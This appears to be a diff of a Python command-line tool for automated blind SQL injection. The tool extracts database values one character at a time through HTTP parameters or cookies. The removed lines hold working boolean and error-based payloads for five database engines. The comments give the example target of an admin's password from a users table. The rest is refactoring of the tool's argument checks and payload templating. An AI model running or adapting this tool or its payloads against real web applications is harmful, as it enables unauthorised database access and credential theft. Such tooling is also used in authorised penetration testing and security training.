@@ -1,11 +1,10 @@
 from urllib.parse import urlparse
-from ast import literal_eval
 import questionary
 import time
 import json
 
 # ------------------ GLOBAL VARS ----------------------
-# ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-$!"
+# ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-&#$!"
 ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyz"
 # ALPHABET = "0123456789abcdef"
 
@@ -20,39 +19,44 @@ class SQLi:
     def __init__(self):
         # HTTP_params: {"key1": "value1", "key2": "<sqli>",}
         self.HTTP_params = {}
-        # injection: {"$data": "password", "$table": "users", "$filter": "username", "$value": "admin"}
-        # keys correspond to: (SELECT $data FROM $table WHERE $filter='$value')
+        # injection: {"<data>": "password", "<table>": "users", "<filter>": "username", "<value>": "admin"}
+        # keys correspond to: (SELECT <data> FROM <table> WHERE <filter>='<value>')
         self.injection = {
-            "$data": "",
-            "$table": "",
-            "$filter": "",
-            "$value": ""
+            "<data>": "",
+            "<table>": "",
+            "<filter>": "",
+            "<value>": ""
         }
         self.options = {
             "SQLi_in_cookie": None
         }
 
     def __str__(self):
-        query = preview_query("(SELECT $data FROM $table WHERE $filter='$value')", self.injection)
+        query = preview_query("(SELECT <data> FROM <table> WHERE <filter>='<value>')", self.injection)
         return f"{self.HTTP_params}\n{query}"
 
 
 def check_args(args: dict) -> bool:
     url = args.URL
     parsed = urlparse(url)
-    if not (parsed.scheme and parsed.netloc and parsed.path):
+    if not (parsed.scheme and parsed.netloc):
+        print("[error] Invalid arguments: Bad URL")
         return False
 
     type = args.type
     if type.lower() not in ["basic", "error", "time", "oast", "custom"]:
+        print("[error] Invalid arguments: Bad type")
         return False
 
     method = args.method
     if method.upper() not in ["GET", "POST"]:
+        print("[error] Invalid arguments: Bad method")
         return False
 
-    engine = args.engine
-    if engine.lower() not in ['oracle', 'microsoft', 'postgre', 'mysql', 'sqlite']:
+    payload = args.payload
+    if not ("<data>" in payload and "<table>" in payload and "<filter>" in payload and
+           "<value>" in payload and "<index>" in payload and "<char>" in payload):
+        print("[error] Invalid arguments: Payload missing argument =>\n\t['<data>', '<table>', '<filter>', '<value>', '<index>', '<char>'] are required")
         return False
 
     delay = args.delay
@@ -62,6 +66,7 @@ def check_args(args: dict) -> bool:
             if value < 0:
                 raise ValueError
         except ValueError:
+            print("[error] Invalid arguments: Bad delay")
             return False
 
     input_file = args.input
@@ -71,55 +76,9 @@ def check_args(args: dict) -> bool:
             try:
                 json.loads(in_json)
             except json.decoder.JSONDecodeError:
+                print("[error] Invalid arguments: Input file isn't a correct Json")
                 return False
-
-    if type == "custom":
-        body = args.body
-        try:
-            evalued = literal_eval(body)
-            if not isinstance(evalued, dict):
-                return False
-        except ValueError:
-            return False
     return True
-
-
-def get_payload(TYPE: str, ENGINE: str) -> str:
-
-    def __get_basic(ENGINE: str) -> str:
-        payloads = {
-            "oracle": "' AND SUBSTR((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char'--",
-            "microsoft": "' AND SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char'--",
-            "postgre": "' AND SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char'--",
-            "mysql": "' AND SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char'-- ",
-            "sqlite": "' AND SUBSTR((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char'--"
-        }
-        return payloads[ENGINE]
-
-    def __get_error(ENGINE: str) -> str:
-        payloads = {
-            "oracle": "' AND (SELECT CASE WHEN SUBSTR((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char' THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--",
-            "microsoft": "' AND (SELECT CASE WHEN SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char' THEN 1/0 ELSE 'a' END)='a'--",
-            "postgre": "' AND (SELECT CASE WHEN SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char' THEN 1/(SELECT 0) ELSE 1 END)=1--",
-            "mysql": "' AND SELECT IF(SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char', (SELECT table_name FROM information_schema.tables),'a')='a'-- ",
-            "sqlite": "' AND (SELECT CASE WHEN SUBSTR((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char' THEN 1/0 ELSE 0 END)='a'--"
-        }
-        return payloads[ENGINE]
-
-    def __get_time(ENGINE: str) -> str:
-        return "Not_ready"
-
-    def __get_oast(ENGINE: str) -> str:
-        return "Not_ready"
-
-    if TYPE == "basic":
-        return __get_basic(ENGINE)
-    if TYPE == "error":
-        return __get_error(ENGINE)
-    elif TYPE == "time":
-        return __get_time(ENGINE)
-    elif TYPE == "oast":
-        return __get_oast(ENGINE)
 
 
 def init_SQLi(SCuLi: SQLi) -> SQLi:
@@ -156,14 +115,14 @@ def init_SQLi(SCuLi: SQLi) -> SQLi:
                         SCuLi.options["SQLi_in_cookie"] = cookie
                     else:
                         print("[warning] The keyword `<>` need to be fixed in the cookie => Nothing was set")
-            
+
             injection = {
-                "$data": "",
-                "$table": "",
-                "$filter": "",
-                "$value": ""
+                "<data>": "",
+                "<table>": "",
+                "<filter>": "",
+                "<value>": ""
             }
-            query = "SELECT $data FROM $table WHERE $filter='$value'"
+            query = "SELECT <data> FROM <table> WHERE <filter>='<value>'"
             print("[setup] Great. Now let me know how to rule the SQL query.")
             print(f"[setup] Each value will replace this keys:\n\t\t {query}")
             for key, value in injection.items():
@@ -171,7 +130,7 @@ def init_SQLi(SCuLi: SQLi) -> SQLi:
                 injection[key] = val
             SCuLi.injection = injection
 
-            print(f"[setup] Perfect. Let's recap':")
+            print("[setup] Perfect. Let's recap':")
             print(f"\tSQL query will look like this: {preview_query(query, SCuLi.injection)}")
             print(f"\tHTTP requests params are: {SCuLi.HTTP_params}")
             confirm = questionary.confirm("Is that all good?").ask()
@@ -195,13 +154,13 @@ def preview_query(payload: str, injection: dict) -> str:
 
 
 def adapt_payload(SCuLi: SQLi, payload: str) -> str:
-    # ' AND SUBSTR((SELECT $data FROM $table WHERE $filter='$value'), $index, 1)--
+    # ' AND SUBSTR((SELECT <data> FROM <table> WHERE <filter>='<value>'), <index>, 1)--
     #   is changed into
-    # ' AND SUBSTR((SELECT password FROM users WHERE username='admin'), $index, 1)--
-    payload = payload.replace('$data', SCuLi.injection['$data'])
-    payload = payload.replace('$table', SCuLi.injection['$table'])
-    payload = payload.replace('$filter', SCuLi.injection['$filter'])
-    payload = payload.replace('$value', SCuLi.injection['$value'])
+    # ' AND SUBSTR((SELECT password FROM users WHERE username='admin'), <index>, 1)--
+    payload = payload.replace('<data>', SCuLi.injection['<data>'])
+    payload = payload.replace('<table>', SCuLi.injection['<table>'])
+    payload = payload.replace('<filter>', SCuLi.injection['<filter>'])
+    payload = payload.replace('<value>', SCuLi.injection['<value>'])
     return payload
 
 
@@ -227,7 +186,7 @@ def print_request(request: dict) -> str:
     output = ""
     output += f"{request['method']} {request['url']} HTTP/2\n"
     for key, value in request['headers'].items():
-        output += f"{key}:{value}\n"
+        output += f"{key}: {value}\n"
     output += f"\n{request['data']}"
     return output
 
@@ -236,6 +195,6 @@ def print_response(response: dict) -> str:
     output = ""
     output += f"HTTP/2 {response['status']} ?\n"
     for key, value in response['headers'].items():
-        output += f"{key}:{value}\n"
+        output += f"{key}: {value}\n"
     output += f"\n{response['data']}"
     return output
